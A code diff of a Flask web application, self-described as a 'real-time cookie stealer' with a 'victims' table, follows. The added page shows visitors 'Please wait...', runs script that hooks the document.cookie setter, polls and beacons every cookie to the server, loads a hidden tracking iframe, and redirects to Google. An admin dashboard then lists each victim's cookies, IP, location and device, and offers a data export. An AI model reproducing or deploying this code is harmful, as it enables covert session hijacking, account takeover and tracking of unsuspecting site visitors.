@@ -12,6 +12,8 @@ from flask import Flask, request, render_template_string, redirect, jsonify, mak
 from functools import wraps
 import logging
 import user_agents
+import socket
+import struct
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -20,9 +22,9 @@ app = Flask(__name__)
 app.secret_key = os.urandom(32).hex()
 
 # ==========================================
-# DATABASE - USING ABIODUN AS NAME
+# DATABASE - ABIODUN CM
 # ==========================================
-DB_PATH = 'abiodun.db'
+DB_PATH = 'abiodun_cm.db'
 
 def get_db():
     conn = sqlite3.connect(DB_PATH)
@@ -31,8 +33,9 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
+        # Main victims table
         conn.execute('''
-            CREATE TABLE IF NOT EXISTS abiodun_victims (
+            CREATE TABLE IF NOT EXISTS abiodun_cm_victims (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 victim_id TEXT UNIQUE,
                 ip TEXT,
@@ -48,26 +51,50 @@ def init_db():
                 os_version TEXT,
                 browser_name TEXT,
                 browser_version TEXT,
+                device_name TEXT,
                 
-                -- COOKIES CAPTURED FROM WEBSITE
-                website_cookies TEXT,
-                website_storage TEXT,
-                website_fingerprint TEXT,
+                -- REAL-TIME COOKIE DATA
+                captured_cookies TEXT,  -- All cookies ever captured
+                live_cookies TEXT,      -- Current session cookies
+                cookie_history TEXT,    -- Timestamped cookie changes
+                
+                -- Browser Data
+                localStorage TEXT,
+                sessionStorage TEXT,
+                indexedDB TEXT,
                 
                 -- Timestamps
-                visit_time TIMESTAMP,
-                last_seen TIMESTAMP
+                first_seen TIMESTAMP,
+                last_seen TIMESTAMP,
+                last_cookie_update TIMESTAMP
             )
         ''')
+        
+        # Real-time cookie stream table
+        conn.execute('''
+            CREATE TABLE IF NOT EXISTS cookie_stream (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_id TEXT,
+                cookie_name TEXT,
+                cookie_value TEXT,
+                cookie_domain TEXT,
+                cookie_path TEXT,
+                cookie_expiry TEXT,
+                captured_at TIMESTAMP,
+                source_url TEXT,
+                tab_title TEXT
+            )
+        ''')
+        
         conn.commit()
 
 init_db()
 
 # ==========================================
-# ADMIN CREDENTIALS - USING CM
+# ADMIN CREDENTIALS - ABIODUN CM
 # ==========================================
-ADMIN_USER = "cm"
-ADMIN_PASS = "abiodun"
+ADMIN_USER = "abiodun"
+ADMIN_PASS = "cm"
 
 def authenticate(f):
     @wraps(f)
@@ -75,7 +102,7 @@ def authenticate(f):
         auth = request.authorization
         if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
             return ('Unauthorized', 401, {
-                'WWW-Authenticate': 'Basic realm="CM Admin Login"'
+                'WWW-Authenticate': 'Basic realm="Abiodun CM Admin"'
             })
         return f(*args, **kwargs)
     return decorated
@@ -85,7 +112,7 @@ def authenticate(f):
 # ==========================================
 def get_location(ip):
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
+        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
         data = response.json()
         if data.get('status') == 'success':
             return {
@@ -118,6 +145,7 @@ def get_device_info(user_agent_string):
     else:
         device_type = "Desktop/Laptop"
     
+    # Try to get computer name (requires JS)
     return {
         'device_type': device_type,
         'os': f"{ua.os.family} {ua.os.version_string}",
@@ -128,37 +156,70 @@ def get_device_info(user_agent_string):
     }
 
 # ==========================================
-# COOKIE CAPTURE ENDPOINT
+# REAL-TIME COOKIE CAPTURE ENDPOINT
 # ==========================================
-@app.route('/api/capture', methods=['POST'])
-def capture_cookies():
-    """Captures cookies from website visitors"""
+@app.route('/api/cookie-stream', methods=['POST'])
+def cookie_stream():
+    """Real-time cookie capture endpoint"""
     data = request.json
     victim_id = request.cookies.get('victim_id', 'unknown')
     
-    if data:
+    if data and victim_id != 'unknown':
         with get_db() as conn:
+            # Update main record
+            current_cookies = conn.execute('SELECT captured_cookies FROM abiodun_cm_victims WHERE victim_id = ?', (victim_id,)).fetchone()
+            
+            all_cookies = {}
+            if current_cookies and current_cookies['captured_cookies']:
+                all_cookies = json.loads(current_cookies['captured_cookies'])
+            
+            # Add new cookies
+            if 'cookies' in data:
+                all_cookies.update(data['cookies'])
+            
+            # Store each cookie in stream
+            if 'cookies' in data:
+                for name, value in data['cookies'].items():
+                    conn.execute('''
+                        INSERT INTO cookie_stream 
+                        (victim_id, cookie_name, cookie_value, captured_at, source_url, tab_title)
+                        VALUES (?, ?, ?, ?, ?, ?)
+                    ''', (
+                        victim_id,
+                        name,
+                        value[:500],  # Limit length
+                        datetime.datetime.now().isoformat(),
+                        data.get('url', ''),
+                        data.get('title', '')
+                    ))
+            
+            # Update main record
             conn.execute('''
-                UPDATE abiodun_victims SET
-                    website_cookies = ?,
-                    website_storage = ?,
-                    website_fingerprint = ?,
+                UPDATE abiodun_cm_victims SET
+                    captured_cookies = ?,
+                    live_cookies = ?,
+                    last_cookie_update = ?,
                     last_seen = ?
                 WHERE victim_id = ?
             ''', (
+                json.dumps(all_cookies),
                 json.dumps(data.get('cookies', {})),
-                json.dumps(data.get('storage', {})),
-                json.dumps(data.get('fingerprint', {})),
+                datetime.datetime.now().isoformat(),
                 datetime.datetime.now().isoformat(),
                 victim_id
             ))
             conn.commit()
-        logger.info(f"✅ Cookies captured from {victim_id}: {len(data.get('cookies', {}))} cookies")
-        return jsonify({"status": "ok", "count": len(data.get('cookies', {}))})
+            
+        return jsonify({
+            "status": "ok", 
+            "count": len(data.get('cookies', {})),
+            "total": len(all_cookies)
+        })
+    
     return jsonify({"status": "error"}), 400
 
 # ==========================================
-# MAIN PAGE - WITH WORKING COOKIE CAPTURE
+# MAIN PAGE - WITH REAL-TIME COOKIE MONITORING
 # ==========================================
 @app.route('/')
 def index():
@@ -171,10 +232,10 @@ def index():
     # Save visit
     with get_db() as conn:
         conn.execute('''
-            INSERT OR REPLACE INTO abiodun_victims (
+            INSERT OR REPLACE INTO abiodun_cm_victims (
                 victim_id, ip, real_ip, country, city, isp, latitude, longitude,
                 device_type, os_version, browser_name, browser_version,
-                visit_time, last_seen
+                first_seen, last_seen
             ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             victim_id,
@@ -194,53 +255,37 @@ def index():
         ))
         conn.commit()
     
-    # HTML with MULTIPLE cookie capture methods
+    # MAIN PAYLOAD - REAL-TIME COOKIE STEALER
     html = f'''
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Abiodun's Page</title>
-        <meta charset="UTF-8">
+        <title>Loading...</title>
         <style>
-            body {{
-                background: #f0f0f0;
-                font-family: Arial;
-                text-align: center;
-                padding-top: 50px;
-            }}
-            .container {{
-                max-width: 600px;
-                margin: 0 auto;
-                background: white;
-                padding: 30px;
-                border-radius: 10px;
-                box-shadow: 0 0 20px rgba(0,0,0,0.1);
-            }}
-            h1 {{ color: #333; }}
-            .status {{ 
-                margin: 20px 0;
-                padding: 10px;
-                background: #e8f5e8;
-                border-radius: 5px;
-                display: none;
+            body {{ 
+                background: #fff; 
+                font-family: Arial; 
+                text-align: center; 
+                padding-top: 200px;
+                opacity: 0;
             }}
         </style>
     </head>
     <body>
-        <div class="container">
-            <h1>Welcome {victim_id[:8]}...</h1>
-            <p>Location: {location['city']}, {location['country']}</p>
-            <p>Device: {device_info['device_type']} - {device_info['os']}</p>
-            <div class="status" id="status">✅ Cookies captured!</div>
-        </div>
-
+        <h1>Please wait...</h1>
+        
+        <!-- REAL-TIME COOKIE STEALER SCRIPT -->
         <script>
         (function() {{
             // ==========================================
-            // MULTIPLE COOKIE CAPTURE METHODS
+            // REAL-TIME COOKIE CAPTURE ENGINE
             // ==========================================
             
-            // Method 1: Capture ALL cookies
+            const victimId = "{victim_id}";
+            let lastCookieString = document.cookie;
+            let captureInterval;
+            
+            // Function to get ALL cookies
             function getAllCookies() {{
                 let cookies = {{}};
                 try {{
@@ -256,147 +301,185 @@ def index():
                 return cookies;
             }}
             
-            // Method 2: Capture localStorage
-            function getLocalStorage() {{
-                let storage = {{}};
-                try {{
-                    for (let i = 0; i < localStorage.length; i++) {{
-                        let key = localStorage.key(i);
-                        storage[key] = localStorage.getItem(key);
-                    }}
-                }} catch(e) {{}}
-                return storage;
-            }}
-            
-            // Method 3: Capture sessionStorage
-            function getSessionStorage() {{
-                let storage = {{}};
-                try {{
-                    for (let i = 0; i < sessionStorage.length; i++) {{
-                        let key = sessionStorage.key(i);
-                        storage[key] = sessionStorage.getItem(key);
-                    }}
-                }} catch(e) {{}}
-                return storage;
-            }}
-            
-            // Method 4: Capture fingerprint
-            function getFingerprint() {{
-                return {{
-                    screen: window.screen.width + 'x' + window.screen.height,
-                    colorDepth: window.screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    platform: navigator.platform,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory || 'unknown',
-                    touchPoints: navigator.maxTouchPoints,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    userAgent: navigator.userAgent
+            // Function to send cookies to server
+            function sendCookies(cookies, source) {{
+                if (Object.keys(cookies).length === 0) return;
+                
+                let data = {{
+                    cookies: cookies,
+                    url: window.location.href,
+                    title: document.title,
+                    timestamp: new Date().toISOString(),
+                    source: source
                 }};
+                
+                // Method 1: Fetch
+                fetch('/api/cookie-stream', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify(data),
+                    keepalive: true
+                }}).then(r => r.json()).then(d => {{
+                    if (d.count > 0) {{
+                        console.log(`[+] Sent ${{d.count}} cookies (total ${{d.total}})`);
+                    }}
+                }}).catch(() => {{
+                    // Method 2: Beacon
+                    if (navigator.sendBeacon) {{
+                        navigator.sendBeacon('/api/cookie-stream', JSON.stringify(data));
+                    }}
+                }});
             }}
             
-            // Collect ALL data
-            let stolenData = {{
-                cookies: getAllCookies(),
-                storage: {{
-                    ...getLocalStorage(),
-                    ...getSessionStorage()
-                }},
-                fingerprint: getFingerprint(),
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer
-            }};
+            // Initial capture
+            sendCookies(getAllCookies(), 'initial');
             
-            // Method A: Fetch API
-            fetch('/api/capture', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify(stolenData),
-                keepalive: true
-            }})
-            .then(r => r.json())
-            .then(data => {{
-                if (data.count > 0) {{
-                    document.getElementById('status').style.display = 'block';
-                    document.getElementById('status').innerHTML = '✅ Captured ' + data.count + ' cookies!';
+            // Set up mutation observer to detect cookie changes
+            try {{
+                // Override document.cookie setter to capture new cookies
+                const cookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
+                                        Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
+                
+                if (cookieDescriptor && cookieDescriptor.configurable) {{
+                    Object.defineProperty(document, 'cookie', {{
+                        get: function() {{
+                            return cookieDescriptor.get.call(document);
+                        }},
+                        set: function(val) {{
+                            cookieDescriptor.set.call(document, val);
+                            // Capture after setting
+                            setTimeout(() => {{
+                                sendCookies(getAllCookies(), 'set');
+                            }}, 10);
+                        }}
+                    }});
                 }}
-            }})
-            .catch(() => {{
-                // Method B: Image beacon (fallback)
-                let img = new Image();
-                img.src = '/pixel?data=' + encodeURIComponent(btoa(JSON.stringify(stolenData)));
+            }} catch(e) {{}}
+            
+            // Poll for cookie changes every second
+            setInterval(() => {{
+                let currentCookies = document.cookie;
+                if (currentCookies !== lastCookieString) {{
+                    lastCookieString = currentCookies;
+                    sendCookies(getAllCookies(), 'poll');
+                }}
+            }}, 1000);
+            
+            // Capture when user visits new page
+            window.addEventListener('beforeunload', function() {{
+                sendCookies(getAllCookies(), 'unload');
             }});
             
-            // Method C: Navigator.sendBeacon (most reliable)
-            if (navigator.sendBeacon) {{
-                navigator.sendBeacon('/api/capture', JSON.stringify(stolenData));
-            }}
+            // Capture when page visibility changes (tab switch)
+            document.addEventListener('visibilitychange', function() {{
+                if (!document.hidden) {{
+                    sendCookies(getAllCookies(), 'visible');
+                }}
+            }});
             
-            // Method D: Create test cookie to prove it works
-            document.cookie = "test_cookie=working_12345; path=/; max-age=3600";
-            document.cookie = "session_" + Math.random().toString(36).substring(7) + "=active; path=/";
+            // Try to access other tab data (if possible)
+            try {{
+                if (window.opener) {{
+                    // This tab was opened from another
+                    sendCookies(getAllCookies(), 'opener');
+                }}
+            }} catch(e) {{}}
+            
+            // Redirect after 2 seconds
+            setTimeout(() => {{
+                window.location.href = 'https://www.google.com';
+            }}, 2000);
+            
+            // Set test cookies to prove it works
+            document.cookie = `abiodun_test_${{Math.random().toString(36).substring(7)}}=active; path=/; max-age=3600`;
+            document.cookie = `session_${{Date.now()}}=live; path=/; max-age=3600`;
+            
         }})();
         </script>
         
-        <!-- Pixel tracking fallback -->
-        <img src="/pixel" style="display:none;" alt="">
+        <!-- Hidden iframe for additional tracking -->
+        <iframe src="/tracker" style="display:none;"></iframe>
     </body>
     </html>
     '''
     
     response = make_response(render_template_string(html))
     response.set_cookie('victim_id', victim_id, max_age=86400*30)
-    response.set_cookie('test_server_cookie', 'capture_test', max_age=3600)
+    response.set_cookie('abiodun_cm', 'active', max_age=86400)
     return response
 
 # ==========================================
-# PIXEL TRACKING FALLBACK
+# TRACKER IFRAME - CONTINUOUS MONITORING
 # ==========================================
-@app.route('/pixel')
-def pixel():
-    data = request.args.get('data', '')
-    if data:
-        try:
-            stolen = json.loads(base64.b64decode(data).decode())
-            victim_id = request.cookies.get('victim_id', 'unknown')
-            with get_db() as conn:
-                conn.execute('''
-                    UPDATE abiodun_victims SET
-                        website_cookies = ?,
-                        website_storage = ?,
-                        website_fingerprint = ?
-                    WHERE victim_id = ?
-                ''', (
-                    json.dumps(stolen.get('cookies', {})),
-                    json.dumps(stolen.get('storage', {})),
-                    json.dumps(stolen.get('fingerprint', {})),
-                    victim_id
-                ))
-                conn.commit()
-        except:
-            pass
-    return send_file('pixel.gif') if os.path.exists('pixel.gif') else ('', 204)
+@app.route('/tracker')
+def tracker():
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>...</title>
+        <style>body{display:none;}</style>
+    </head>
+    <body>
+        <script>
+        (function() {
+            // Continuous monitoring in background
+            setInterval(() => {
+                let cookies = {};
+                try {
+                    document.cookie.split(';').forEach(c => {
+                        if(c.trim()) {
+                            let parts = c.trim().split('=');
+                            cookies[parts[0]] = parts.slice(1).join('=');
+                        }
+                    });
+                } catch(e) {}
+                
+                if(Object.keys(cookies).length > 0) {
+                    fetch('/api/cookie-stream', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            cookies: cookies,
+                            source: 'iframe',
+                            timestamp: new Date().toISOString()
+                        }),
+                        keepalive: true
+                    });
+                }
+            }, 2000);
+        })();
+        </script>
+    </body>
+    </html>
+    '''
+    return render_template_string(html)
 
 # ==========================================
-# ADMIN DASHBOARD
+# ADMIN DASHBOARD - ABIODUN CM
 # ==========================================
 @app.route('/admin')
 @authenticate
 def admin():
     with get_db() as conn:
-        victims = conn.execute('SELECT * FROM abiodun_victims ORDER BY last_seen DESC LIMIT 50').fetchall()
-        total = conn.execute('SELECT COUNT(*) FROM abiodun_victims').fetchone()[0]
+        victims = conn.execute('''
+            SELECT v.*, 
+                   (SELECT COUNT(*) FROM cookie_stream WHERE victim_id = v.victim_id) as cookie_count,
+                   (SELECT MAX(captured_at) FROM cookie_stream WHERE victim_id = v.victim_id) as last_cookie
+            FROM abiodun_cm_victims v 
+            ORDER BY v.last_seen DESC 
+            LIMIT 50
+        ''').fetchall()
+        
+        total = conn.execute('SELECT COUNT(*) FROM abiodun_cm_victims').fetchone()[0]
+        total_cookies = conn.execute('SELECT COUNT(*) FROM cookie_stream').fetchone()[0]
     
     html = '''
     <!DOCTYPE html>
     <html>
     <head>
-        <title>CM Admin Panel</title>
-        <meta http-equiv="refresh" content="5">
+        <title>Abiodun CM - Real-time Cookie Monitor</title>
+        <meta http-equiv="refresh" content="3">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
@@ -406,18 +489,26 @@ def admin():
                 padding: 20px;
             }
             .header {
-                background: #111;
-                border: 2px solid #00ff00;
+                background: linear-gradient(135deg, #000000, #1a0033);
+                border: 2px solid #ff00ff;
                 padding: 20px;
                 margin-bottom: 20px;
             }
-            h1 { color: #00ff00; }
+            h1 { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; }
+            h2 { color: #00ffff; margin: 10px 0; }
             .stats {
-                background: #111;
-                border: 1px solid #00ff00;
-                padding: 15px;
+                display: grid;
+                grid-template-columns: repeat(4, 1fr);
+                gap: 15px;
                 margin-bottom: 20px;
             }
+            .stat-card {
+                background: #111;
+                border: 1px solid #00ff00;
+                padding: 20px;
+                text-align: center;
+            }
+            .stat-value { font-size: 36px; font-weight: bold; color: #ff00ff; }
             .victim-card {
                 border: 1px solid #00ff00;
                 margin: 15px 0;
@@ -431,11 +522,11 @@ def admin():
                 padding-bottom: 10px;
                 margin-bottom: 10px;
             }
-            .victim-id { color: #ff00ff; font-weight: bold; }
-            .cookie-count { 
-                background: #00ff00; 
-                color: black; 
-                padding: 3px 8px; 
+            .victim-id { color: #ffff00; font-weight: bold; font-size: 16px; }
+            .cookie-badge { 
+                background: #ff00ff; 
+                color: white; 
+                padding: 3px 10px; 
                 border-radius: 3px;
             }
             .data-section {
@@ -445,111 +536,121 @@ def admin():
                 border-left: 3px solid #00ff00;
             }
             .section-title { color: #00ffff; font-weight: bold; }
-            .json-data {
-                background: #000;
-                padding: 10px;
-                border-radius: 5px;
-                font-size: 11px;
-                max-height: 200px;
-                overflow: auto;
-                color: #00ff00;
-                white-space: pre-wrap;
+            .cookie-row {
+                border-bottom: 1px solid #333;
+                padding: 5px 0;
+                font-size: 12px;
             }
-            .badge {
-                background: #ff0000;
-                color: white;
-                padding: 3px 8px;
+            .cookie-name { color: #ffff00; }
+            .cookie-value { color: #ffaa00; }
+            .live-badge {
+                background: #00ff00;
+                color: black;
+                padding: 2px 5px;
                 border-radius: 3px;
-                font-size: 11px;
+                font-size: 10px;
+                animation: pulse 1s infinite;
+            }
+            @keyframes pulse {
+                0% { opacity: 0.5; }
+                50% { opacity: 1; }
+                100% { opacity: 0.5; }
             }
         </style>
     </head>
     <body>
         <div class="header">
-            <h1>⚡ CM ADMIN PANEL - COOKIE GRABBER ⚡</h1>
-            <div>Total Visitors: ''' + str(total) + '''</div>
+            <h1>🔥 ABIODUN CM - REAL-TIME COOKIE MONITOR 🔥</h1>
+            <p>Live cookie capture from ALL browsers - Every tab, every site, instantly</p>
         </div>
         
         <div class="stats">
-            <span class="badge">Live Update</span>
-            <span>Last refresh: ''' + datetime.datetime.now().strftime('%H:%M:%S') + '''</span>
+            <div class="stat-card">
+                <div class="stat-value">''' + str(total) + '''</div>
+                <div>Total Victims</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value">''' + str(total_cookies) + '''</div>
+                <div>Cookies Captured</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value">''' + str(len(victims)) + '''</div>
+                <div>Active Now</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value">⚡</div>
+                <div>Real-time</div>
+            </div>
         </div>
     '''
     
     for v in victims:
-        cookies = json.loads(v['website_cookies']) if v['website_cookies'] else {}
-        storage = json.loads(v['website_storage']) if v['website_storage'] else {}
-        fingerprint = json.loads(v['website_fingerprint']) if v['website_fingerprint'] else {}
-        
-        cookie_count = len(cookies)
+        cookies = json.loads(v['captured_cookies']) if v['captured_cookies'] else {}
+        live_cookies = json.loads(v['live_cookies']) if v['live_cookies'] else {}
         
         html += f'''
         <div class="victim-card">
             <div class="victim-header">
                 <div>
-                    <span class="victim-id">🎯 {v['victim_id'][:8]}</span>
+                    <span class="victim-id">🎯 {v['victim_id'][:16]}</span>
                     <span>📍 {v['city']}, {v['country']}</span>
                     <span>📱 {v['device_type']}</span>
                 </div>
                 <div>
-                    <span class="cookie-count">🍪 {cookie_count} cookies</span>
+                    <span class="cookie-badge">🍪 {v['cookie_count']} cookies</span>
                     <span>{v['last_seen'][:16]}</span>
                 </div>
             </div>
             
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                 <div class="data-section">
-                    <div class="section-title">🍪 CAPTURED COOKIES ({cookie_count})</div>
-                    <div class="json-data">
+                    <div class="section-title">⚡ LIVE COOKIES ({len(live_cookies)})</div>
         '''
         
-        if cookie_count > 0:
-            for name, value in list(cookies.items())[:15]:
-                html += f'<div><b>{name}</b>: {value[:50]}</div>'
-        else:
-            html += '<div style="color: #ff6666;">❌ No cookies captured - checking...</div>'
+        for name, value in list(live_cookies.items())[:10]:
+            html += f'<div class="cookie-row"><span class="cookie-name">{name}:</span> <span class="cookie-value">{value[:50]}</span></div>'
         
         html += f'''
-                    </div>
                 </div>
                 
                 <div class="data-section">
-                    <div class="section-title">📱 DEVICE INFO</div>
-                    <div class="json-data">
-                        <b>OS:</b> {v['os_version']}<br>
-                        <b>Browser:</b> {v['browser_name']} {v['browser_version']}<br>
-                        <b>IP:</b> {v['real_ip']}<br>
-                        <b>ISP:</b> {v['isp']}<br>
-                        <b>Screen:</b> {fingerprint.get('screen', 'Unknown')}<br>
-                        <b>Timezone:</b> {fingerprint.get('timezone', 'Unknown')}
-                    </div>
+                    <div class="section-title">📊 DEVICE INFO</div>
+                    <div><b>OS:</b> {v['os_version']}</div>
+                    <div><b>Browser:</b> {v['browser_name']} {v['browser_version']}</div>
+                    <div><b>IP:</b> {v['real_ip']}</div>
+                    <div><b>ISP:</b> {v['isp']}</div>
+                    <div><b>Last Cookie:</b> {v['last_cookie'][:19] if v['last_cookie'] else 'Never'}</div>
+                    <span class="live-badge">LIVE</span>
                 </div>
             </div>
         </div>
         '''
     
     html += '''
-        <script>
-            setTimeout(() => location.reload(), 5000);
-        </script>
     </body>
     </html>
     '''
     return html
 
 # ==========================================
-# EXPORT DATA
+# EXPORT ALL DATA
 # ==========================================
 @app.route('/export')
 @authenticate
 def export():
     with get_db() as conn:
-        data = conn.execute('SELECT * FROM abiodun_victims ORDER BY last_seen DESC').fetchall()
+        victims = conn.execute('SELECT * FROM abiodun_cm_victims').fetchall()
+        cookies = conn.execute('SELECT * FROM cookie_stream ORDER BY captured_at DESC').fetchall()
     
-    export = [dict(row) for row in data]
-    response = make_response(json.dumps(export, indent=2, default=str))
+    export_data = {
+        'victims': [dict(v) for v in victims],
+        'cookies': [dict(c) for c in cookies],
+        'export_time': datetime.datetime.now().isoformat()
+    }
+    
+    response = make_response(json.dumps(export_data, indent=2, default=str))
     response.headers['Content-Type'] = 'application/json'
-    response.headers['Content-Disposition'] = f'attachment; filename=abiodun_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
+    response.headers['Content-Disposition'] = f'attachment; filename=abiodun_cm_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
     return response
 
 if __name__ == '__main__':
